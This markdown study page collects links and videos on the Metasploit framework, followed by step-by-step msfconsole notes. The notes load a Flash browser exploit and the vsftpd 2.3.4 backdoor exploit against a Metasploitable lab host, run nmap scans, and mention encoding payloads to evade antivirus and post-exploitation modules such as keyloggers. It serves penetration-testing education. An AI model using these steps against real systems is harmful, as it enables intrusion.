### Metasploit Readings and Videos<p>
  
[Metasploit for Beginners](https://www.concise-courses.com/security/metasploit-for-beginners/).<br />
[A Tour of the Metasploit Framework](http://www.ethicalhackx.com/metasploit-framework/).<br />

<p>
Youtube: Metasploit for Beginners<br />
  
[![thumbnail from the video](http://img.youtube.com/vi/cnkLv_RE3EI/0.jpg)](https://www.youtube.com/watch?v=cnkLv_RE3EI "MetaSploit tutorial for beginners")<p>
<p>
  
[Setting up a Metasploit postgresql database](https://www.offensive-security.com/metasploit-unleashed/using-databases/).<p>
<p>
Hak5's Metasploit Minute series<br />
  
[![thumbnail from the video](http://img.youtube.com/vi/NTdthBQYa1k/0.jpg)](https://www.youtube.com/watch?v=NTdthBQYa1k "5 Ways To Get Initial Access - Metasploit Minute")<p>

Hackersploit's Metasploit For Beginners - #1 - The Basics - Modules, Exploits & Payloads<br />
  
[![thumbnail from the video](http://img.youtube.com/vi/8lR27r8Y_ik/0.jpg)](https://www.youtube.com/watch?v=8lR27r8Y_ik "Metasploit For Beginners - #1 - The Basics - Modules, Exploits & Payloads")<p>
<p>
  
  ### Demonstration and Things to Remember<br />
  <br />
  start postgresql before msfconsole<br />
  searching: type and platform<br />
  <p>
  commands:<br />
  
  * search type:exploit platform:windows flash
  * help
  * use exploit/windows/browser/adobe_flash_avm2 (turns red if loaded)
  * show options (customize the attack) and set SRVPORT 80
  
  ANOTHER and BETTER EXAMPLE:
  * use ZenMap to see software running and note network topography
  * db_nmap_status, db_nmap -T4 -A -v metasploitableIP
  * show (gives lots of info)
  * show info (good place to start)
  * show payloads (shows all of the payloads available)
  * show targets
  * search vsftpd
  * use exploit/unix/ftp/vsftpd_234_backdoor
  * info
  * set RHOST 10.______
  * finish with 'exploit'
  <p>
  Modules directory:  /usr/share/metasploit-framework<br />
  NOPS for buffer overflows<br />
  Encoding for sneaking through antivirus<br />
  post for further attacks are being pwned (keyloggers, VNC, etc.)<br />
  post/windows/gather <--btc-mining and other scripts<br />
  
  Armitage - GUI for MSF
  
  ezsploit automation
  
  Reconnaisance<br />
  
 CTFR[![CTFR](https://photos-4.dropbox.com/t/2/AABPmqpitqtIqkLe8nXzxTH6GGOvRqDiBucgkZefQIa9Ew/12/2203034/png/32x32/1/_/1/2/Screenshot%202018-03-09%2008.55.59.png/EKe03gEYs7e3KiACKAI/Wa4tQYtFPlQvKFdkJmYTRP8c7QYl5EUPQFt_vYscTWc?preserve_transparency=1&size=2048x1536&size_mode=3)]
  
